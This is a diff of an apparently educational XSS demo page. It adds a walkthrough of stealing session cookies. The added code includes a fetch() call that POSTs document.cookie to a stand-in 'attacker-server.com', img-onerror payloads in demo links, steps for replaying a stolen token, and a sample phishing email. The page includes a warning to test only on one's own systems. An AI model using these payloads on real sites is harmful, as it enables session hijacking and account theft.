@@ -88,20 +88,88 @@
                 move on to discuss a <b>real powerful example</b> that XSS is known for &ndash; accessing user
                 <b>session tokens</b> through exfiltrating <code>document.cookie</code> !
             </p>
+            <p>
+                <i>Session tokens</i> are strings of text that act as an alternative password to keep the end user
+                logged into a service. Typically, session tokens expire after a set amount of time; however, in some
+                cases, the expiration time may not exist or would be long enough for a malicious user to compromise
+                the target user's account.
+            </p>
+            <h4>Getting a target user's session token data</h4>
+            <p>
+                Accessing the user's cookies is quite easy. It can be done in just one simple line:
+                <code>document.cookie</code> &ndash; That's it! This returns a string containing a
+                <code>key1=value1;key2=value2;key3=value3</code> format which can be instantly copied and pasted into
+                the attacker's machine.
+            </p>
+            <p>
+                The power of this attack comes when we are able to call <code>fetch()</code> to pipe the contents of
+                <code>document.cookie</code> to a server that the attacker hosts. In other words, everyone who runs the
+                following code would have their login credentials stolen instantly. Here's an example of how that could
+                be done:
+            </p>
+            <code class="code-block">
+                fetch("https://attacker-server.com/cookie-storage", {
+                <br />
+                &emsp;&emsp;method: "POST",
+                <br />
+                &emsp;&emsp;body: JSON.stringify({cookies: document.cookie})
+                <br />
+                }).then();
+            </code>
+            <h4>What this allows us to do</h4>
+            <p>
+                The very second a target user opens this link, within a few milliseconds, their credentials are stolen.
+                Now on our end, we can inject the cookie, and <i>impersonate</i> the user, as we have essentially cloned
+                sessions. This can be done like so:
+            </p>
+            <code class="code-block">
+                document.cookie = "xss_test_session=STOLEN_TOKEN";
+            </code>
+            <p>
+                <b>BOOM!</b> Access to the user's account is now granted, and we can do whatever we want. Change their
+                passwords, make purchases, access credit cards, anything they can do, we can now do as well.
+            </p>
+            <h4>Simulating a cookie attack</h4>
+            <p>Here's an example of a payload that would print the content of the cookie to the screen:</p>
+            <div class="url-block">
+                <a class="url-try" href="attack1.html?username=http://localhost:63342/xss-demo/attack1.html?username=%3Cimg%20src=%22evil%22%20onerror=%22prompt('You%20have%20been%20hacked!%20Your%20session%20token%20is:',%20document.cookie.split('=')%5B1%5D)%22%3E">Try &rarr;</a>
+                <code>
+                    &lt;img src="evil" onerror="prompt('You have been hacked! Your session token is:',
+                    document.cookie.split('=')[1])"&gt;
+                </code>
+            </div>
+            <h4>Third party JavaScript fetch</h4>
+            <p>
+                In this example, a request is made to a <a href="https://thesimpsonsquoteapi.glitch.me/" target="_blank">Simpsons API</a>
+                to demonstrate that it is possible to send the cookie to third party services, such as a web server
+                hosted by you as the attacker.
+            </p>
+            <p>
+                A fetch request is made to the API to fetch a Simpsons quote, which then triggers a JavaScript promise
+                to decode the JSON response from the server and display it on the page. Of course, in typical attacks
+                you may not want to display anything after the data has been sent successfully &ndash; that's the point.
+                XSS is a secretive attack that the user may not even notice has occurred in the background.
+            </p>
+            <div class="url-block">
+                <a class="url-try" href="attack1.html?username=%3Cimg%20src=%22evil%22%20onerror=%22const%20msg%20=%20document.getElementById('xss-content');%20msg.textContent='awaiting%20xss%20request...';%20fetch('https://thesimpsonsquoteapi.glitch.me/quotes').then((res)%20=%3E%20%7Bres.json().then((json)%20=%3E%20%7Bmsg.innerHTML=(%60%3Cb%3EQuote%20from%20The%20Simpsons:%3C/b%3E%3Cbr%3E$%7Bjson%5B0%5D%5B'character'%5D%7D:%20$%7Bjson%5B0%5D%5B'quote'%5D%7D%60);%7D);%7D);%22%3E">Try &rarr;</a>
+                <code>
+                    &lt;img src="evil" onerror="const msg = document.getElementById('xss-content'); msg.textContent='awaiting xss request...'; fetch('https://thesimpsonsquoteapi.glitch.me/quotes').then((res) => {res.json().then((json) => {msg.innerHTML=(`&lt;b&gt;Quote from The Simpsons:&lt;/b&gt;&lt;br&gt;${json[0][\'character\']}: ${json[0][\'quote\']}`);});});"&gt;
+                </code>
+            </div>
             <blockquote>
-                <b>HINT</b>
+                <b>DANGER</b>
                 <p>
-                    <i>Session tokens</i> are strings of text that act as an alternative password to keep the end user
-                    logged into a service. Typically, session tokens expire after a set amount of time; however, in some
-                    cases, the expiration time may not exist or would be long enough for a malicious user to compromise
-                    the target user's account.
+                    Under no circumstances should you ever try to actually attempt to hijack a user's session with any
+                    methods listed here without permission. These methods have typically already been patched by most major corporations.
+                    It is not worth getting yourself in trouble. <u>Be smart, test on your own hosted systems only.</u>
                 </p>
             </blockquote>
+            <h4>Deceptive messages</h4>
             <p>
-                This becomes even more powerful as the link appears to be a genuine link that wouldn't look any
-                different from what the user is used to seeing on the site. For example, imagine my domain was a user's
-                cloud service provider. The link could look like the following in a fake email sent from an attacker.
-                Click <b>Try</b> to see it in action and to learn more.
+                This becomes even more powerful in deceptive message attacks as the dangerous link appears to be a
+                genuine link that wouldn't look any different from what the user is used to seeing on the site. For
+                example, imagine my domain was a user's cloud service provider. The link could look like the following
+                in a fake email sent from an attacker. Click <b>Try</b> to see it in action and to learn more.
             </p>
             <code class="code-block">
                 Hi John,
@@ -116,18 +184,25 @@
                 <br />
                 Super Secure Cloud Company
             </code>
+            <br />
+            <hr />
             <h2>Try it yourself!</h2>
+            <p>The best way to learn is to learn by doing. Try some of the interactive examples here.</p>
+            <h3>Try simple XSS attacks</h3>
+            <p>Try the demo below. You can write HTML here. Your browser will navigate to the endpoint you enter.</p>
             <blockquote>
                 <b>NOTE</b>
                 <p>
-                    Normally, <i>this would need to be URI encoded first</i>, but this demo handles that for you before
+                    Normally, <u>this would need to be URI encoded first</u>, but this demo handles that for you before
                     redirecting to the endpoint, so you can just focus on programming your XSS attack.
                 </p>
             </blockquote>
-            <p>Try the demo below. You can write HTML here. Your browser will navigate to the endpoint you enter.</p>
+            <h4>How to use this example</h4>
             <p>
                 If you need an example to get started, click <b>Example</b> to populate the field with a pre-made
                 XSS attack.
+                <br />
+                Click <b>Copy Link</b> to see the encoded URL and share it with your friends.
                 <br />
                 Press <i>Ctrl + Enter</i> or click <b>Run</b> to navigate to the page.
                 <br />
@@ -142,14 +217,15 @@
             <h3>Advanced: Try cookie grabber attacks</h3>
             <p>
                 Want to experiment with how session tokens could be stolen? I've included one in this site called
-                <code>session</code> which, by default, is set to <code>my_secret_session_token</code>.
+                <code>xss_test_session</code> which, by default, is set to <code>my_secret_session_token</code>.
             </p>
+            <h4>Setting the cookie</h4>
             <p>
                 Use the field below to change its value. You can open the <a target="_blank" href="https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/What_are_browser_developer_tools#how_to_open_the_devtools_in_your_browser">DevTools menu</a>
                 in your browser to view its value. You may also use the JavaScript console to set this cookie.
             </p>
-            <p>The cookie is currently set to: <b><code id="attack1-cookie-value">loading</code></b></p>
-            <label for="attack1-cookie">Cookie value</label>
+            <p>The <code>xss_test_session</code> cookie is currently set to: <b><code id="attack1-cookie-value">loading</code></b></p>
+            <label id="attack1-cookie-label" for="attack1-cookie">Cookie value</label>
             <input id="attack1-cookie" type="text">
             <br />
             <button id="attack1-cookie-set" class="primary">Save &check;</button>
